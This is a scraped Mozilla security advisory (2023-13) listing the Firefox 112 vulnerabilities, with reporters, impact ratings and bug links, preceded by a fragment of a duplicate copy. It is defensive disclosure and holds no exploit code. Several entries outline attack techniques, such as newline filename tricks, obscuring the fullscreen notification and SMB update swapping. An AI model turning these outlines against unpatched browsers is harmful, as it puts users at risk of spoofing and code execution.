* [Bug 1777588](https://bugzilla.mozilla.org/show_bug.cgi?id=1777588)

#### [#CVE-2023-29548: Incorrect optimization result on ARM64](#CVE-2023-29548)

Reporter
JunYoung Park
Impact
low
##### Description

A wrong lowering instruction in the ARM64 Ion compiler resulted in a wrong optimization result.

##### References

* [Bug 1822754](https://bugzilla.mozilla.org/show_bug.cgi?id=1822754)

#### [#CVE-2023-29550: Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](#CVE-2023-29550)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Andrew Osmond, Sebastian Hengst, Andrew McCreight, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 111 and Firefox ESR 102.9. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1720594%2C1751945%2C1812498%2C1814217%2C1818357%2C1818762%2C1819493%2C1820389%2C1820602%2C1821448%2C1822413%2C1824828)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from www.mozilla.org_acf64303_20250114_221424.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2023-13

## Security Vulnerabilities fixed in Firefox 112, Firefox for Android 112, Focus for Android 112

Announced
April 11, 2023
Impact
high
Products
Firefox, Firefox for Android, Focus for Android
Fixed in

* Firefox 112
* Firefox for Android 112
* Focus for Android 112

#### [#CVE-2023-29531: Out-of-bound memory access in WebGL on macOS](#CVE-2023-29531)

Reporter
DoHyun Lee
Impact
high
##### Description

An attacker could have caused an out of bounds memory access using WebGL APIs, leading to memory corruption and a potentially exploitable crash.
*This bug only affects Firefox for macOS. Other operating systems are unaffected.*

##### References

* [Bug 1794292](https://bugzilla.mozilla.org/show_bug.cgi?id=1794292)

#### [#CVE-2023-29532: Mozilla Maintenance Service Write-lock bypass](#CVE-2023-29532)

Reporter
Holger Fuhrmannek
Impact
high
##### Description

A local attacker can trick the Mozilla Maintenance Service into applying an unsigned update file by pointing the service at an update file on a malicious SMB server. The update file can be replaced after the signature check, before the use, because the write-lock requested by the service does not work on a SMB server.
*Note: This attack requires local system access and only affects Windows. Other operating systems are not affected.*

##### References

* [Bug 1806394](https://bugzilla.mozilla.org/show_bug.cgi?id=1806394)

#### [#CVE-2023-29533: Fullscreen notification obscured](#CVE-2023-29533)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A website could have obscured the fullscreen notification by using a combination of `window.open`, fullscreen requests, `window.name` assignments, and `setInterval` calls. This could have led to user confusion and possible spoofing attacks.

##### References

* [Bug 1814597](https://bugzilla.mozilla.org/show_bug.cgi?id=1814597)
* [Bug 1798219](https://bugzilla.mozilla.org/show_bug.cgi?id=1798219)

#### [#CVE-2023-29534: Fullscreen notification could have been obscured on Firefox for Android](#CVE-2023-29534)

Reporter
Shaheen Fazim and Hafiizh
Impact
high
##### Description

Different techniques existed to obscure the fullscreen notification in Firefox and Focus for Android. These could have led to potential user confusion and spoofing attacks.
*This bug only affects Firefox and Focus for Android. Other versions of Firefox are unaffected.*

##### References

* [Bug 1816059](https://bugzilla.mozilla.org/show_bug.cgi?id=1816059)
* [Bug 1816007](https://bugzilla.mozilla.org/show_bug.cgi?id=1816007)
* [Bug 1821155](https://bugzilla.mozilla.org/show_bug.cgi?id=1821155)
* [Bug 1821576](https://bugzilla.mozilla.org/show_bug.cgi?id=1821576)
* [Bug 1821906](https://bugzilla.mozilla.org/show_bug.cgi?id=1821906)
* [Bug 1822298](https://bugzilla.mozilla.org/show_bug.cgi?id=1822298)
* [Bug 1822305](https://bugzilla.mozilla.org/show_bug.cgi?id=1822305)

#### [#CVE-2023-1999: Double-free in libwebp](#CVE-2023-1999)

Reporter
Irvan Kurniawan
Impact
high
##### Description

A double-free in libwebp could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1819244](https://bugzilla.mozilla.org/show_bug.cgi?id=1819244)

#### [#CVE-2023-29535: Potential Memory Corruption following Garbage Collector compaction](#CVE-2023-29535)

Reporter
Lukas Bernhard
Impact
high
##### Description

Following a Garbage Collector compaction, weak maps may have been accessed before they were correctly traced. This resulted in memory corruption and a potentially exploitable crash.

##### References

* [Bug 1820543](https://bugzilla.mozilla.org/show_bug.cgi?id=1820543)

#### [#CVE-2023-29536: Invalid free from JavaScript code](#CVE-2023-29536)

Reporter
zx from qriousec
Impact
high
##### Description

An attacker could cause the memory manager to incorrectly free a pointer that addresses attacker-controlled memory, resulting in an assertion, memory corruption, or a potentially exploitable crash.

##### References

* [Bug 1821959](https://bugzilla.mozilla.org/show_bug.cgi?id=1821959)

#### [#CVE-2023-29537: Data Races in font initialization code](#CVE-2023-29537)

Reporter
Looben Yang
Impact
high
##### Description

Multiple race conditions in the font initialization could have led to memory corruption and execution of attacker-controlled code.

##### References

* [Bug 1823365](https://bugzilla.mozilla.org/show_bug.cgi?id=1823365)
* [Bug 1824200](https://bugzilla.mozilla.org/show_bug.cgi?id=1824200)
* [Bug 1825569](https://bugzilla.mozilla.org/show_bug.cgi?id=1825569)

#### [#CVE-2023-29538: Directory information could have been leaked to WebExtensions](#CVE-2023-29538)

Reporter
Alexis aka zoracon
Impact
moderate
##### Description

Under specific circumstances a WebExtension may have received a `jar:file:///` URI instead of a `moz-extension:///` URI during a load request. This leaked directory paths on the user's machine.

##### References

* [Bug 1685403](https://bugzilla.mozilla.org/show_bug.cgi?id=1685403)

#### [#CVE-2023-29539: Content-Disposition filename truncation leads to Reflected File Download](#CVE-2023-29539)

Reporter
Trung Pham
Impact
moderate
##### Description

When handling the filename directive in the Content-Disposition header, the filename would be truncated if the filename contained a NULL character. This could have led to reflected file download attacks potentially tricking users to install malware.

##### References

* [Bug 1784348](https://bugzilla.mozilla.org/show_bug.cgi?id=1784348)

#### [#CVE-2023-29540: Iframe sandbox bypass using redirects and sourceMappingUrls](#CVE-2023-29540)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Using a redirect embedded into `sourceMappingUrls` could allow for navigation to external protocol links in sandboxed iframes without `allow-top-navigation-to-custom-protocols`.

##### References

* [Bug 1790542](https://bugzilla.mozilla.org/show_bug.cgi?id=1790542)

#### [#CVE-2023-29541: Files with malicious extensions could have been downloaded unsafely on Linux](#CVE-2023-29541)

Reporter
Ameen Basha M K
Impact
moderate
##### Description

Firefox did not properly handle downloads of files ending in `.desktop`, which can be interpreted to run attacker-controlled commands.
*This bug only affects Firefox for Linux on certain Distributions. Other operating systems are unaffected, and Mozilla is unable to enumerate all affected Linux Distributions.*

##### References

* [Bug 1810191](https://bugzilla.mozilla.org/show_bug.cgi?id=1810191)

#### [#CVE-2023-29542: Bypass of file download extension restrictions](#CVE-2023-29542)

Reporter
Shaheen Fazim and Ameen Basha M K
Impact
moderate
##### Description

A newline in a filename could have been used to bypass the file extension security mechanisms that replace malicious file extensions such as .lnk with .download. This could have led to accidental execution of malicious code.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1815062](https://bugzilla.mozilla.org/show_bug.cgi?id=1815062)
* [Bug 1810793](https://bugzilla.mozilla.org/show_bug.cgi?id=1810793)

#### [#CVE-2023-29543: Use-after-free in debugging APIs](#CVE-2023-29543)

Reporter
Lukas Bernhard
Impact
moderate
##### Description

An attacker could have caused memory corruption and a potentially exploitable use-after-free of a pointer in a global object's debugger vector.

##### References

* [Bug 1816158](https://bugzilla.mozilla.org/show_bug.cgi?id=1816158)

#### [#CVE-2023-29544: Memory Corruption in garbage collector](#CVE-2023-29544)

Reporter
Lukas Bernhard
Impact
moderate
##### Description

If multiple instances of resource exhaustion occurred at the incorrect time, the garbage collector could have caused memory corruption and a potentially exploitable crash.

##### References

* [Bug 1818781](https://bugzilla.mozilla.org/show_bug.cgi?id=1818781)

#### [#CVE-2023-29545: Windows Save As dialog resolved environment variables](#CVE-2023-29545)

Reporter
Axel Chong (@Haxatron)
Impact
moderate
##### Description

Similar to CVE-2023-28163, this time when choosing 'Save Link As', suggested filenames containing environment variable names would have resolved those in the context of the current user.
*This bug only affects Firefox on Windows. Other versions of Firefox are unaffected.*

##### References

* [Bug 1823077](https://bugzilla.mozilla.org/show_bug.cgi?id=1823077)

#### [#CVE-2023-29546: Screen recording in Private Browsing included address bar on Android](#CVE-2023-29546)

Reporter
Irwan
Impact
low
##### Description

When recording the screen while in Private Browsing on Firefox for Android the address bar and keyboard were not hidden, potentially leaking sensitive information.
*This bug only affects Firefox for Android. Other operating systems are unaffected.*

##### References

* [Bug 1780842](https://bugzilla.mozilla.org/show_bug.cgi?id=1780842)

#### [#CVE-2023-29547: Secure document cookie could be spoofed with insecure cookie](#CVE-2023-29547)

Reporter
Marco Squarcina
Impact
low
##### Description

When a secure cookie existed in the Firefox cookie jar an insecure cookie for the same domain could have been created, when it should have silently failed. This could have led to a desynchronization in expected results when reading from the secure cookie.

##### References

* [Bug 1783536](https://bugzilla.mozilla.org/show_bug.cgi?id=1783536)

#### [#CVE-2023-29548: Incorrect optimization result on ARM64](#CVE-2023-29548)

Reporter
JunYoung Park
Impact
low
##### Description

A wrong lowering instruction in the ARM64 Ion compiler resulted in a wrong optimization result.

##### References

* [Bug 1822754](https://bugzilla.mozilla.org/show_bug.cgi?id=1822754)

#### [#CVE-2023-29549: Javascript's bind function may have failed](#CVE-2023-29549)

Reporter
Lukas Bernhard
Impact
low
##### Description

Under certain circumstances, a call to the `bind` function may have resulted in the incorrect realm. This may have created a vulnerability relating to JavaScript-implemented sandboxes such as SES.

##### References

* [Bug 1823042](https://bugzilla.mozilla.org/show_bug.cgi?id=1823042)

#### [#CVE-2023-29550: Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](#CVE-2023-29550)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Randell Jesup, Andrew Osmond, Sebastian Hengst, Andrew McCreight, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 111 and Firefox ESR 102.9. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 112 and Firefox ESR 102.10](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1720594%2C1812498%2C1814217%2C1818357%2C1751945%2C1818762%2C1819493%2C1820389%2C1820602%2C1821448%2C1822413%2C1824828)

#### [#CVE-2023-29551: Memory safety bugs fixed in Firefox 112](#CVE-2023-29551)

Reporter
Mozilla developers and community
Impact
high
##### Description

Mozilla developers Randell Jesup, Andrew McCreight, Gabriele Svelto, and the Mozilla Fuzzing Team reported memory safety bugs present in Firefox 111. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 112](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1763625%2C1814314%2C1815798%2C1815890%2C1819239%2C1819465%2C1819486%2C1819492%2C1819957%2C1820514%2C1820776%2C1821838%2C1822175%2C1823547)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)


